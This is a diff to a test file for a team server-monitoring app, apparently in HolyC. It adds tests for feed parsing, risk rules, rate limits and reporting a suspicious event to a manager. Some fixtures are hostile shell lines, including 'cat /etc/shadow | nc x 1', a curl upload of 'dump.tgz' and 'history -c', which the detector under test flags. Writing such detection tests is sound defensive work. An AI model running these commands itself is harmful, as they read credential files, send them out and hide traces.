@@ -6,6 +6,7 @@
 #include "../src/crypto.HC"
 #include "../src/link.HC"
 #include "../src/log.HC"
+#include "../src/events.HC"
 #include "../src/station.HC"
 #include "../src/team.HC"
 #include "../src/deadlines.HC"
@@ -55,6 +56,43 @@ Bool Click(App *a, I64 id, I64 arg = 0)
 Entry *Newest(App *a)
 {
   return &a->st->log->entries[a->st->log->count - 1];
+}
+
+// Appends text to the station's feed file, as tools/ark-watch does.
+U0 Feed(App *a, U8 *text)
+{
+  U8 *path = StationPath(a->st, "feed");
+  I32 fd = open(path, O_WRONLY | O_CREAT | O_APPEND, MODE_FILE);
+  WriteAll(fd, text, StrLen(text));
+  close(fd);
+  Free(path);
+  PollFeed(a);
+}
+
+I64 Hits(App *a, I64 id)
+{
+  Draw(a);
+  I64 n = 0;
+  for (I64 i = 0; i < a->hit_count; i++)
+    if (a->hits[i].id == id)
+      n++;
+  return n;
+}
+
+I64 FindEvent(Log *log, U8 *detail)
+{
+  for (I64 i = log->count - 1; i >= 0; i--)
+    if (log->entries[i].kind == KIND_EVENT && strstr(log->entries[i].body, detail) != NULL)
+      return i;
+  return -1;
+}
+
+U0 Deliver(Station *from, Station *to)
+{
+  U8 *msg = MAlloc(MSG_MAX);
+  for (I64 i = 0; i < from->log->count; i++)
+    StationReceive(to, msg, MakeMessage(from, &from->log->entries[i], msg));
+  Free(msg);
 }
 
 I32 Main(I32 argc, U8 **argv)
@@ -202,11 +240,102 @@ I32 Main(I32 argc, U8 **argv)
   Key(a, KEY_RETURN);
   Check(Newest(a)->kind == KIND_ALERT && AlertCount(a) == 1 && UnackedAlerts(a) == 0, "my own alerts post but don't alert me");
 
+  // Server events: parsing a feed line.
+  Event ev;
+  U8 *line = "shell\teve\tfs-01\tcat /etc/shadow | nc x 1";
+  Check(FeedLine(line, StrLen(line), &ev) && ev.source == EV_SHELL && StrCmp(ev.user, "eve") == 0 &&
+        StrCmp(ev.detail, "cat /etc/shadow / nc x 1") == 0, "a feed line parses, with '|' made safe");
+  line = "telnet\teve\tfs-01\tx";
+  Check(!FeedLine(line, StrLen(line), &ev), "an unknown source is refused");
+  line = "shell\teve\tfs-01";
+  Check(!FeedLine(line, StrLen(line), &ev), "a line with three fields is refused");
+  line = "shell\teve\tfs-01\tawk -F\t x";
+  Check(FeedLine(line, StrLen(line), &ev) && StrCmp(ev.detail, "awk -F  x") == 0, "a tab in the command stays in the detail");
+
+  // Risk rules.
+  U8 *why;
+  ev.source = EV_SHELL;
+  StrCpy(ev.detail, "cat /etc/shadow");
+  Check(EventRisk(&ev, 12, &why) == RISK_SUS, "reading /etc/shadow is suspicious");
+  StrCpy(ev.detail, "ls -la /srv");
+  Check(EventRisk(&ev, 12, &why) == RISK_NONE, "ls is not flagged");
+  StrCpy(ev.detail, "CURL -T dump.tgz https://x");
+  Check(EventRisk(&ev, 12, &why) == RISK_SUS, "uploading with curl is suspicious, any case");
+  StrCpy(ev.detail, "curl https://example.com");
+  Check(EventRisk(&ev, 12, &why) == RISK_WATCH, "a plain download is only worth watching");
+  ev.source = EV_LOGIN;
+  StrCpy(ev.user, "marcus");
+  StrCpy(ev.detail, "ssh from 10.0.4.22");
+  Check(EventRisk(&ev, 14, &why) == RISK_NONE && EventRisk(&ev, 3, &why) == RISK_WATCH,
+        "a login is flagged only at night");
+  StrCpy(ev.user, "root");
+  Check(EventRisk(&ev, 14, &why) == RISK_SUS, "a root login is suspicious");
+
+  // The feed file turns into signed server events.
+  I64 before_feed = a->st->log->count;
+  Feed(a, "shell\tsvc-backup\tfs-01\tcat /etc/shadow\nbogus line\nlogin\tmarcus\tfs-01\tssh from 10.0.4.22\n");
+  Check(a->st->log->count == before_feed + 2 && Newest(a)->kind == KIND_EVENT,
+        "two good feed lines become events, the bad one is skipped");
+  Feed(a, "shell\tsvc-backup\tfs-01\thistory");
+  Check(a->st->log->count == before_feed + 2, "half a line waits for its newline");
+  Feed(a, " -c\n");
+  Check(a->st->log->count == before_feed + 3 && strstr(Newest(a)->body, "history -c") != NULL,
+        "the rest of the line completes it");
+  a->feed_window = time(NULL);
+  a->feed_posted = 0;
+  before_feed = a->st->log->count;
+  U8 *burst = MAlloc(64 * 40);
+  burst[0] = 0;
+  for (I64 i = 0; i < 40; i++)
+    StrCpy(burst + StrLen(burst), "shell\tbot\tfs-01\tls\n");
+  Feed(a, burst);
+  Check(a->st->log->count == before_feed + FEED_RATE, "a burst is capped at the rate limit");
+  a->feed_window -= FEED_WINDOW;
+  Feed(a, "shell\tbot\tfs-01\tls\n");
+  Check(a->st->log->count == before_feed + FEED_RATE + 2 && strstr(a->st->log->entries[a->st->log->count - 2].body, "10 more events") != NULL,
+        "the dropped events are counted in one entry");
+
+  a->view = V_LOG;
+  Check(Hits(a, H_EVENT) == 0, "the chat log doesn't show server events");
+  a->view = V_SERVER;
+  Check(Hits(a, H_EVENT) > 0, "the server log does");
+  RefreshRisk(a);
+  Check(a->sus_open == 2, "two suspicious events wait for a report");
+  I64 shadow = FindEvent(a->st->log, "cat /etc/shadow");
+  Check(Click(a, H_SFILTER, SF_SUS) && Hits(a, H_EVENT) == 2, "the Suspicious filter shows just those two");
+  Check(Click(a, H_EVENT, shadow) && a->selected == shadow, "clicking a row picks it");
+  Check(Hits(a, H_REPORT) == 0, "the manager has no report button");
+
+  // A member reports it; the manager's station sees the alert.
+  App *m = AppNew("build/tmp-ui-test-b", "/nonexistent", NULL);
+  m->st = b;
+  m->cv = a->cv;
+  m->mode = MODE_READY;
+  Deliver(a->st, b);
+  I64 bshadow = FindEvent(b->log, "cat /etc/shadow");
+  m->view = V_SERVER;
+  m->selected = bshadow;
+  I64 alerts_before = AlertCount(a);
+  Check(Click(m, H_REPORT, bshadow), "a member can press Report to manager");
+  Check(b->log->entries[b->log->count - 1].kind == KIND_ALERT, "the report is a signed alert");
+  Deliver(b, a->st);
+  RefreshRisk(a);
+  Check(AlertCount(a) == alerts_before + 1 && UnackedAlerts(a) == 1, "the manager gets the alert");
+  Check(ReportOf(a, &a->st->log->entries[shadow]) != NULL && a->sus_open == 1, "the event shows as reported");
+  Check(StrNCmp(AlertText(a->st->log->entries[a->st->log->count - 1].body), "svc-backup on fs-01", 19) == 0,
+        "the alert reads without its reference");
+  I64 bcount = b->log->count;
+  ReportEvent(m, bshadow);
+  Check(b->log->count == bcount, "an event is reported once");
+  m->view = V_SERVER;
+  Check(Hits(m, H_REPORT) == 0, "and the button is gone after");
+  a->alerts_acked = AlertCount(a);
+
   for (I64 v = 0; v < VIEWS; v++) {
     a->view = v;
     Draw(a);
   }
-  Check(TRUE, "every page draws with a cut and an alert in the log");
+  Check(TRUE, "every page draws with a cut, alerts and server events in the log");
 
   Click(a, H_LOCK);
   Check(!a->quit, "one lock press only arms it");
